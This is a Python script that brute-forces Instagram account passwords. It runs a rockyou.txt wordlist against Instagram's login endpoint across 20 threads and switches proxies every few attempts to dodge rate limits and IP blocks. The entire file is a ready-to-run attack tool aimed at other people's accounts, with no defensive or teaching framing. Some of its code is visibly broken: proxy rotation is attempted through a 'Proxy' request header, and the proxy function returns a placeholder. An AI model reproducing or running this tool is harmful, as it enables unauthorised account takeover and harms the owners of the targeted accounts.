import concurrent.futures
import requests
import time
import random


# Function to read passwords from a file
def read_passwords(password_file):
    try:
        with open(password_file, 'r', encoding='latin-1') as file:
            passwords = [line.strip() for line in file]
        return passwords
    except FileNotFoundError:
        print(f"File '{password_file}' not found.")
        return None
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        return None


# Function to perform the brute force attack for a single password
def try_password(username, password, login_url, headers, attempt_count):
    session = requests.Session()

    login_data = {
        'username': username,
        'password': password,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1616608652:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    try:
        print(f"Trying password: {password}")  # Display current password being tried
        response = session.post(login_url, data=login_data, headers=headers)
        if response.status_code == 200 and response.json().get('authenticated'):
            print(f"Password found: {password}")
            return True  # Return True if password is found
    except Exception as e:
        print(f"An error occurred while trying {password}: {e}")
    finally:
        # Introduce a delay between attempts
        time.sleep(random.uniform(1, 3))  # Random delay between 1 to 3 seconds
    return False  # Return False if password is not found


# Function to perform the brute force attack
def insta_brute_force(username, password_list):
    if not password_list:
        return

    login_url = "https://www.instagram.com/accounts/login/ajax/"

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    headers = {
        "User-Agent": user_agent,
        "X-Requested-With": "XMLHttpRequest"
    }

    password_threads = 20  # Number of password checking threads
    failed_attempts = 0
    proxy = None

    with concurrent.futures.ThreadPoolExecutor(max_workers=password_threads) as executor:
        futures = []
        for password in password_list:
            futures.append(executor.submit(try_password, username, password, login_url, headers, failed_attempts))
            failed_attempts += 1

            if failed_attempts == 4:
                # Change the proxy here (switching IP)
                proxy = get_new_proxy()  # Implement a function to switch proxy
                headers['Proxy'] = proxy
                failed_attempts = 0

        for future in concurrent.futures.as_completed(futures):
            if future.result():  # Check if password is found
                return  # Exit the function if password is found


# Function to get a new proxy (implement your logic here)
def get_new_proxy():
    # Implement logic to switch to a new proxy (e.g., Tor IP change)
    return "YOUR_NEW_PROXY_HERE"  # Placeholder for the new proxy address


# Main function
if __name__ == "__main__":
    username = input("Enter the username: ")
    default_password_file = 'rockyou.txt'  # Default password file
    use_default = input(f"Use default password list ({default_password_file})? (Y/N): ").lower()

    if use_default == 'y':
        password_list = read_passwords(default_password_file)
    else:
        custom_password_file = input("Enter the path to the custom password list file: ")
        password_list = read_passwords(custom_password_file)

    insta_brute_force(username, password_list)
